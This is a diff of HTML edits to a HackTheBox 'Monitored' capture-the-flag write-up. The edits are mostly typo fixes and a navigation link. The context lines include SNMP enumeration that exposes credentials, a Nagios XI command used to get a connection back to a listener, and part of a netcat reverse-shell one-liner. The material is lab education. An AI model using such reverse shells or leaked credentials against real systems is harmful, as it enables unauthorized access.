@@ -322,7 +322,7 @@ if (!doNotTrack) {
 <p>The command below creates a lot of output on the terminal so I sent it to a file.</p>
 </blockquote>
 <pre tabindex="0"><code>snmpwalk -c public -v1 -t 10 10.10.11.248 &gt; snmp.txt
-</code></pre><p>Going over the output I find some lines referencing a script <code>/opt/scripts/check_host.sh</code> with what seems to look like some credentials <code>svc:XjH7VCehowpR1xZB</code>.</p>
+</code></pre><p>Going over the output we find some lines referencing a script <code>/opt/scripts/check_host.sh</code> with what seems to look like some credentials <code>svc:XjH7VCehowpR1xZB</code>.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Monitored/creds-snmp.png" alt="SNMP potential credentials"></p>
 <p>The credentials did not work on <code>https://nagios.monitored.htb/nagiosxi/terminal/</code> and we get the message that this user account is either disabled or non-existent at <code>https://nagios.monitored.htb/nagiosxi/login.php</code>.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Monitored/nagiosxi-login-attempt.png" alt="NagiosXI login attempt failed"></p>
@@ -379,9 +379,9 @@ if (!doNotTrack) {
 <p>You also have to click <code>Apply Configuration</code> for the new command to be listed. Now you should see <code>149 Commands</code>.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Monitored/apply-config.png" alt="Apply configuration"></p>
 <p>Let&rsquo;s start a listener on the port specified in our command.</p>
-<p>To run the command Go to <code>Monitoring</code> &gt; <code>Hosts</code> &gt; click on <code>localhost</code>.</p>
+<p>To run the command go to <code>Monitoring</code> &gt; <code>Hosts</code> &gt; click on <code>localhost</code>.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Monitored/localhost.png" alt="Configuration - localhost"></p>
-<p>Under <code>Check command</code>, select your command and click <code>Run Check Commad</code> and you will get a connection on your listener.</p>
+<p>Under <code>Check command</code>, select your command and click <code>Run Check Command</code> and you will get a connection on your listener.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Monitored/nagios-shell.png" alt="Initial Foothold"></p>
 <p>You can get the user flag at <code>/home/nagios/user.txt</code>.</p>
 <p><img src="https://scorpiosec.com/images/HTB-Monitored/user-flag.png" alt="User flag"></p>
@@ -570,6 +570,13 @@ echo &#39;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.10.15.4 555
         
 
         <div class="pagination__buttons">
+            
+            <span class="button previous">
+                <a href="https://scorpiosec.com/posts/2024/05/htb-bizness/">
+                    <span class="button__icon">←</span>
+                    <span class="button__text">HTB Bizness</span>
+                </a>
+            </span>
             
 
             
